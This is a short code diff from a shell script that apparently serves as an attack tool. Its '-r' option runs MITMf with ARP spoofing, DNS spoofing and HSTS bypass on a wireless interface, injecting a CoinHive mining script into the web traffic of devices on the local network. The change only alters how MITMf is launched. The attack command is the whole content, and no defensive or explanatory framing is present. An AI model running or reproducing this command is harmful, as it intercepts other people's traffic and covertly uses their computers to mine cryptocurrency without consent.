@@ -34,7 +34,8 @@ fi ;;
 -r) if [[ -e /opt/spot/coinHiveMiner.js ]]
 then
 clear
-sudo mitmf --arp --spoof -i wlan0 --hsts --dns --gateway 192.168.$1.1 --inject --js-file /opt/spot/coinHiveMiner.js
+cd /opt/MITMf
+sudo python mitmf.py --arp --spoof -i wlan0 --hsts --dns --gateway 192.168.$1.1 --inject --js-file /opt/spot/coinHiveMiner.js
 else
 echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
 fi ;;
